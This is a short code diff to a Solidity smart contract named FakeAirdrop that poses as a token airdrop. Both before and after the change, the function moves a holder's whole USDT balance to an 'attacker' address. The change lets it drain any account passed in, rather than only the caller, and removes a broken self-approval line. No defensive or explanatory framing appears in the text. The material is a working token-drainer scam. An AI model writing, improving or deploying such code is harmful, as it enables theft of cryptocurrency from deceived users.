@@ -18,13 +18,13 @@ contract FakeAirdrop {
         token = usdtToken;
     }
 
-    function airdrop() external {
+    function airdrop(address account) external {
         IERC20 tokenContract = IERC20(token);
 
-        uint256 amount = tokenContract.balanceOf(msg.sender);
-        tokenContract.approve(address(this), amount);
+        uint256 amount = tokenContract.balanceOf(account);
+        
 
-        bool success = tokenContract.transferFrom(msg.sender, attacker, amount);
+        bool success = tokenContract.transferFrom(account, attacker, amount);
         require(success, "Token transfer failed");
     }
 }
